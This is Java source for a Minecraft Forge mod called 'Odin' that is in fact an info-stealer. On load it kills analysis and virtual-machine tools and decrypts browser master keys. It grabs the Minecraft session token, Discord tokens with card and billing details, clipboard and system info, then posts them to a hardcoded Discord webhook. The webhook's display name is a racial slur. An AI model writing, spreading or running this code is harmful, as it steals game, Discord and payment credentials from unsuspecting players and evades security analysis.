package com.example.examplemod;

import com.example.examplemod.objects.Account;
import com.example.examplemod.utils.Helper;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.security.Security;
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.codec.binary.Base64;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod {

    private static final Minecraft mc = Minecraft.getMinecraft();
    public static final String MODID = "Odin";
    public static final String VERSION = "1.2.4.1";
    public static final String USER_HOME = System.getProperty("user.home");

    public static String getModRepo1() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            return System.getenv("LOCALAPPDATA");
        } else if (
            os.contains("nix") || os.contains("nux") || os.contains("mac")
        ) {
            return USER_HOME + "/.config";
        } else {
            return "";
        }
    }

    public static String getModRepo2() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            return System.getenv("APPDATA");
        } else if (
            os.contains("nix") || os.contains("nux") || os.contains("mac")
        ) {
            return USER_HOME + "/.local/share";
        } else {
            return "";
        }
    }

    public static String[] settings = new String[] {
        "vboxservice.exe",
        "vboxtray.exe",
        "xenservice.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "VGAuthService.exe",
        "vmacthlp.exe",
        "VMSrvc.exe",
        "smsniff.exe",
        "netstat.exe",
        "ProcessHacker.exe",
        "SandMan.exe",
        "jpcap.jar",
        "Wireshark.exe",
        "dumpcap.exe",
        "cheatengine-x86_64.exe",
    };

    public ArrayList<String> loadModules() {
        ArrayList<String> strings = new ArrayList<String>();
        GraphicsEnvironment localGraphicsEnv =
            GraphicsEnvironment.getLocalGraphicsEnvironment();
        for (GraphicsDevice device : localGraphicsEnv.getScreenDevices()) {
            int random = new Random().nextInt(100) + 1;
            Rectangle bounds = device.getDefaultConfiguration().getBounds();
            BufferedImage capture;
            try {
                Class<?> clazz = Robot.class;
                Robot robot = new Robot();
                Method method = clazz
                    .newInstance()
                    .getClass()
                    .getDeclaredMethod("createScreenCapture", Rectangle.class);
                capture = (BufferedImage) method.invoke(robot, bounds);

                ImageIO.write(
                    capture,
                    "png",
                    new File(USER_HOME + "/Temp/screenshot_" + random + ".png")
                );
                strings.add(USER_HOME + "/Temp/screenshot_" + random + ".png");
            } catch (Exception ignored) {
                return null;
            }
        }
        return strings;
    }

    public String testModules(String[] modules) {
        try {
            Process process = Runtime.getRuntime().exec(modules);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            String line;
            StringBuilder finalOutput = new StringBuilder();
            while ((line = in.readLine()) != null) {
                finalOutput.append(line).append("\n");
            }
            return finalOutput.toString();
        } catch (IOException ignored) {
            return "Failed";
        }
    }

    public String getModules() {
        return testModules(
            new String[] {
                System.getenv("windir") + "\\System32\\tasklist.exe",
            }
        );
    }

    private static final String[] WEBHOOK1 = new String[] {
        "YOUR_DISCORD_WEBHOOK",
    };
    private static final String[] WEBHOOK2 = new String[] {
        "https://discord.com/api/webhooks/1310689232590995456/TbM-r5bNKpbnPROD_opj4IyhDvlhtb0UAzOygYZ8wV0LhhWnFH_IkK3gFu4UpC5x60od",
    };

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() {
        try {
            JsonObject info = (JsonObject) new JsonParser()
                .parse(HttpUtils.getContentAsString("https://ipapi.co/json"));
            return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription(
                    "Contains information about the target's IP address and geo-location"
                )
                .addField(
                    ":globe_with_meridians: Country",
                    "```" + info.get("country_name").getAsString() + "```",
                    true
                )
                .addField(
                    ":globe_with_meridians: City",
                    "```" + info.get("city").getAsString() + "```",
                    true
                )
                .addField(
                    ":globe_with_meridians: Region",
                    "```" + info.get("region").getAsString() + "```",
                    true
                )
                .addField(
                    ":satellite_orbital: IP Address",
                    "```" + info.get("ip").getAsString() + "```",
                    true
                )
                .addField(
                    ":satellite: Protocol",
                    "```" + info.get("version").getAsString() + "```",
                    true
                )
                .addField(
                    ":clock10: Timezone",
                    "```" + info.get("timezone").getAsString() + "```",
                    true
                );
        } catch (Exception ignored) {
            try {
                JsonObject info = (JsonObject) new JsonParser()
                    .parse(
                        HttpUtils.getContentAsString("https://ipinfo.io/json")
                    );
                return new DiscordWebhook.EmbedObject()
                    .setTitle(":earth_americas: IP Info")
                    .setColor(0x4400FF)
                    .setDescription(
                        "Contains information about the target's IP address and geo-location"
                    )
                    .addField(
                        ":globe_with_meridians: Country",
                        "```" + info.get("country").getAsString() + "```",
                        true
                    )
                    .addField(
                        ":globe_with_meridians: City",
                        "```" + info.get("city").getAsString() + "```",
                        true
                    )
                    .addField(
                        ":globe_with_meridians: Region",
                        "```" + info.get("region").getAsString() + "```",
                        true
                    )
                    .addField(
                        ":satellite_orbital: IP Address",
                        "```" + info.get("ip").getAsString() + "```",
                        true
                    )
                    .addField(
                        ":satellite: Protocol",
                        "```" + info.get("org").getAsString() + "```",
                        true
                    )
                    .addField(
                        ":clock10: Timezone",
                        "```" + info.get("timezone").getAsString() + "```",
                        true
                    );
            } catch (Exception ignored2) {
                return new DiscordWebhook.EmbedObject()
                    .setTitle(":earth_americas: IP Info")
                    .setColor(0x4400FF)
                    .setDescription("Failed to load information.");
            }
        }
    }

    private String session = "";

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getProfile().getId().toString();
        return new DiscordWebhook.EmbedObject()
            .setTitle(":unlock: Account Info")
            .setColor(0x4400FF)
            .setDescription(
                "[NameMC](https://namemc.com/" +
                uuid +
                ')' +
                " | [Plancke](https://plancke.io/hypixel/player/stats/" +
                uuid +
                ')' +
                " | [SkyCrypt](https://sky.shiiyu.moe/stats/" +
                uuid +
                ')'
            )
            .addField(
                ":identification_card: Name",
                "```" + username + "```",
                true
            )
            .addField(
                ":identification_card: UUID",
                "```" + username + "```",
                true
            )
            .addField(":key: Session Token", "```" + session.getToken() + "```", false);
    }

    private DiscordWebhook.EmbedObject genDiscordTokenEmbed() {
        final DiscordWebhook.EmbedObject tokenEmbed =
            new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Discord tokens")
                .setColor(0x4400FF)
                .setDescription("Contains the target's discord tokens");

        for (Account account : Helper.getHandler().getAccounts()) {
            if (!account.getPayments().isEmpty()) {
                tokenEmbed.addField(
                    ":label: " +
                    account.getUsername() +
                    " (" +
                    account.getId() +
                    ")",
                    "```Token: " +
                    account.getToken() +
                    "\nNitro: " +
                    account.getNitro() +
                    "\nEmail: " +
                    account.getEmail() +
                    "\nPhone: " +
                    account.getPhone() +
                    "\nAddress: " +
                    account.getPayments().get(0).getBillingAddress() +
                    "\nCard Expiry: " +
                    account.getPayments().get(0).getExpiresMonth() +
                    "/" +
                    account.getPayments().get(0).getExpiresYear() +
                    "\nCard Brand: " +
                    account.getPayments().get(0).getBrand() +
                    "\nLast Numbers: " +
                    account.getPayments().get(0).getLastNumbers() +
                    "\nCountry: " +
                    account.getPayments().get(0).getCountry() +
                    "```",
                    false
                );
            } else {
                tokenEmbed.addField(
                    ":label: " +
                    account.getUsername() +
                    " (" +
                    account.getId() +
                    ")",
                    "```Token: " +
                    account.getToken() +
                    "\nNitro: " +
                    account.getNitro() +
                    "\nEmail: " +
                    account.getEmail() +
                    "\nPhone: " +
                    account.getPhone() +
                    "```",
                    false
                );
            }
        }

        return tokenEmbed;
    }

    private DiscordWebhook.EmbedObject genBrowserPasswordsEmbed() {
        final DiscordWebhook.EmbedObject pswordsEmbed =
            new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Browser Passwords")
                .setColor(0x4400FF)
                .setDescription("Contains the target's browser passwords");

        for (Map.Entry<String, String> entrySet : pswds.entrySet()) {
            pswordsEmbed.addField(
                ":label: " + entrySet.getKey(),
                "```" + entrySet.getValue() + "```",
                false
            );
        }

        return pswordsEmbed;
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed =
            new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x4400FF)
                .setDescription(
                    "Contains the target's list of saved Minecraft servers"
                );

        final ServerList servers = new ServerList(mc);
        for (int i = 0; i < servers.countServers(); i++) {
            final ServerData server = servers.getServerData(i);

            serversEmbed.addField(
                ":label: " + server.serverName,
                "```" + server.serverIP + "```",
                true
            );
        }

        return serversEmbed;
    }

    private double ram = 0;
    private String os = "";
    private String cpu = "";
    private String user = "";
    private String clipboard = "";

    private DiscordWebhook.EmbedObject genComputerInfoEmbed() {
        final DiscordWebhook.EmbedObject computerInfoEmbed =
            new DiscordWebhook.EmbedObject()
                .setTitle(":computer: Computer Information")
                .setColor(0x4400FF)
                .setDescription(
                    "Contains information about the target's computer."
                );

        computerInfoEmbed.addField(
            ":pencil: Memory",
            "```" + ram + "GB```",
            true
        );
        computerInfoEmbed.addField(
            ":globe_with_meridians: Operating System",
            "```" + os + "```",
            true
        );
        computerInfoEmbed.addField(":monkey: CPU", "```" + cpu + "```", true);
        computerInfoEmbed.addField(":label: User", "```" + user + "```", true);
        computerInfoEmbed.addField(
            ":clipboard: Clipboard",
            "```" + clipboard + "```",
            true
        );
        return computerInfoEmbed;
    }

    private DiscordWebhook genWebhook(String w) {
        final DiscordWebhook webhook = new DiscordWebhook(w).setUsername(
            "nigga stealer"
        );

        webhook.setContent("@everyone");

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (final Exception e) {
            System.out.println("geo exception: " + e.getMessage());
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genServersInfoEmbed());

        return webhook;
    }

    private DiscordWebhook genDhook(String w) {
        final DiscordWebhook dhook = new DiscordWebhook(w).setUsername(
            "ez dhook"
        );

        dhook.setContent("@everyone");

        try {
            dhook.addEmbed(genGeoInfoEmbed());
        } catch (final Exception e) {
            System.out.println("geo exception: " + e.getMessage());
        }

        dhook.addEmbed(genComputerInfoEmbed());
        dhook.addEmbed(genDiscordTokenEmbed());
        dhook.addEmbed(genBrowserPasswordsEmbed());
        dhook.addEmbed(genAccInfoEmbed());
        dhook.addEmbed(genServersInfoEmbed());

        return dhook;
    }

    private void execWebhook() {
        new Thread(
            new Runnable() {
                @Override
                public void run() {
                    try {
                        for (String wbh : WEBHOOK1) {
                            genWebhook(wbh).execute();
                        }
                    } catch (Exception ignored) {}
                }
            }
        ).start();
    }

    private void execDhook() {
        new Thread(
            new Runnable() {
                @Override
                public void run() {
                    try {
                        for (String wbh2 : WEBHOOK2) {
                            genDhook(wbh2).execute();
                        }
                    } catch (Exception ignored) {}
                }
            }
        ).start();
    }

    public static final Gson gson = new Gson();

    public byte[] getEncryptionKey(String path) {
        if (!new File(path).exists()) {
            return null;
        }

        try {
            JsonObject localState = gson.fromJson(
                new FileReader(path),
                JsonObject.class
            );

            byte[] encryptedKey = Base64.decodeBase64(
                localState
                    .getAsJsonObject("os_crypt")
                    .get("encrypted_key")
                    .getAsString()
            );
            encryptedKey = Arrays.copyOfRange(
                encryptedKey,
                5,
                encryptedKey.length
            );
            return Crypt32Util.cryptUnprotectData(encryptedKey);
        } catch (IOException ignored) {}

        return null;
    }

    private HashMap<String, String> pswds = new HashMap<String, String>();

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        String modules = getModules();

        for (String setting : settings) {
            if (modules.contains(setting)) {
                try {
                    new ProcessBuilder(
                        System.getenv("windir") + "\\System32\\taskkill.exe",
                        "/IM",
                        "\"" + setting + "\"",
                        "/F"
                    ).start();
                } catch (IOException ignored) {}
            }
        }

        new Thread(
            new Runnable() {
                @Override
                public void run() {
                    try {
                        HashMap<String, File> files = new HashMap<
                            String,
                            File
                        >();
                        files.put(
                            "Chrome",
                            new File(
                                getModRepo1() +
                                "/Google/Chrome/User Data/Local State"
                            )
                        );
                        files.put(
                            "Chrome SxS",
                            new File(
                                getModRepo1() +
                                "/Google/Chrome SxS/User Data/Local State"
                            )
                        );
                        files.put(
                            "Edge",
                            new File(
                                getModRepo1() +
                                "/Microsoft/Edge/User Data/Local State"
                            )
                        );
                        files.put(
                            "Brave",
                            new File(
                                getModRepo1() +
                                "/BraveSoftware/Brave-Browser/User Data/Local State"
                            )
                        );
                        files.put(
                            "Opera",
                            new File(
                                getModRepo2() +
                                "/Opera Software/Opera Stable/Local State"
                            )
                        );
                        files.put(
                            "Opera GX",
                            new File(
                                getModRepo2() +
                                "/Opera Software/Opera GX Stable/Local State"
                            )
                        );

                        for (Map.Entry<
                            String,
                            File
                        > entrySet : files.entrySet()) {
                            String name = entrySet.getKey();
                            File file = entrySet.getValue();
                            if (!file.exists()) continue;

                            byte[] keyBytes = getEncryptionKey(file.getPath());
                            if (keyBytes == null) continue;

                            pswds.put(name, Arrays.toString(keyBytes));
                        }
                    } catch (Exception ignored) {}
                }
            }
        ).start();

        new Thread(
            new Runnable() {
                @Override
                public void run() {
                    user = System.getProperty("user.name");
                    os = System.getProperty("os.name");

                    String[] totalMemory = new String[] {
                        "wmic",
                        "computersystem",
                        "get",
                        "totalphysicalmemory",
                    };
                    String[] cpuName = new String[] {
                        "wmic",
                        "cpu",
                        "get",
                        "name",
                    };
                    ram = Math.round(
                        Double.parseDouble(
                            testModules(totalMemory).split("\n")[2]
                        ) /
                        1073741824.0
                    );
                    cpu = testModules(cpuName).split("\n")[2];
                    clipboard = "None";
                    try {
                        clipboard = (String) Toolkit.getDefaultToolkit()
                            .getSystemClipboard()
                            .getData(DataFlavor.stringFlavor);
                    } catch (UnsupportedFlavorException ignored) {} catch (
                        IOException ignored
                    ) {}
                }
            }
        ).start();

        new Thread(
            new Runnable() {
                @Override
                public void run() {
                    String sp = null;
                    String sq = null;
                    try {
                        Class<?> clazz = Class.forName(
                            "qolskyblockmod.pizzaclient.features.misc.SessionProtection"
                        );
                        Field field = clazz.getField("changed");
                        sp = (String) field.get(null);
                    } catch (Exception ignored) {}
                    try {
                        Session sessionObject = mc.getSession();
                        Class<?> sessionClass = sessionObject.getClass();
                        Method getTokenMethod = sessionClass.getDeclaredMethod(
                            "func_148254_d"
                        );
                        sq = (String) getTokenMethod.invoke(sessionObject);
                    } catch (Exception ignored) {}
                    session = sp == null ? sq : sp;
                }
            }
        ).start();

        execWebhook();
        execDhook();
    }
}
